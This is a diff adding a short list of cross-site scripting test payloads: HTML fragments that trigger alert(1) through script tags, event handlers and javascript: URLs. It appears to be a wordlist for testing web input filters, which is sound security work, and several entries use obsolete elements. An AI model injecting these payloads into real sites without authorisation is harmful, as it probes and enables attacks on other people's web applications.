@@ -1,0 +1,20 @@
+<script>alert(1)</script>
+<img src="x" onerror="alert(1)">
+<svg onload=alert(1)>
+<marquee onstart=alert(1)></marquee>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<a href="javascript:alert(1)">Click Me</a>
+<input value="XSS" onfocus="alert(1)">
+<details open ontoggle=alert(1)></details>
+<isindex prompt="XSS"><script>alert(1)</script>
+<embed src="javascript:alert(1)">
+<object data="javascript:alert(1)"></object>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<form><button formaction="javascript:alert(1)">Click</button></form>
+<audio src="x" onerror="alert(1)"></audio>
+<video src="x" onerror="alert(1)"></video>
+<command oncommand=alert(1)></command>
+<keygen onfocus=alert(1)></keygen>
+<progress value=1 max=2 onprogress=alert(1)></progress>
+<meter value=1 max=2 onmouseover=alert(1)></meter>
